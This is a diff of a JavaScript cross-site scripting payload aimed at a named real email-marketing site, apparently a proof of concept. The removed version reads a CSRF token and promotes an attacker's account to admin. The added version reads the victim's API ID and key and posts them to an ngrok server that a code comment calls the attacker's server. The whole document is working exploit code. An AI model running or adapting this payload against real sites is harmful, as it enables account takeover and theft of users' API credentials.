@@ -1,13 +1,28 @@
 var req1 = new XMLHttpRequest();
-        req1.onload = handleResponse;
-        req1.open('get','/my_account/users',true);
-        req1.send();
-        function handleResponse() {
-        var authenticity_token = encodeURIComponent(document.getElementsByTagName("input")['authenticity_token'].value);
-        alert('authenticity_token = ' + authenticity_token);
-        var becomeAdmin = new XMLHttpRequest();
-        // This sends the post request with the attacker's ID to become admin
-        becomeAdmin.open('post', 'https://www.robly.com/my_account/update_user_type?id=41154', true);
-        becomeAdmin.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
-        becomeAdmin.send('utf8=%E2%9C%93&_method=put&user%5Brole_id%5D=6&commit=Save&authenticity_token='+authenticity_token)
+    req1.onload = req1Listener;
+    req1.open('get', '/my_account/api_details', true);
+    req1.withCredentials = true;
+    req1.send('{}');
+        function req1Listener() {
+        document.write(this.responseText);
         };
+        
+        req1.onreadystatechange = function()
+        {
+            if (req1.readyState == 4 && req1.status == 200)
+            {
+                var req2 = new XMLHttpRequest();
+                    req2.onload = handleResponse;
+                    req2.open('get','/my_account/api_details',true);
+                    req2.send();
+                    function handleResponse() {
+                        var api_ID = document.getElementsByTagName("span").api_id.firstChild.data
+                        var api_Key = document.getElementsByTagName("span").api_key.firstChild.data
+                        alert('api_ID = ' + api_ID + '\n' + 'api_Key =' + api_Key);
+                        var stealInfo = new XMLHttpRequest();
+        // This sends all victim's details(including api_ID, api_Key) to attackers server
+                        stealInfo.open('post', 'https://f259aff8887f.ngrok.io', true);
+                        stealInfo.send('api_ID = ' + api_ID + '&api_Key =' + api_Key)
+                };
+            }
+        }
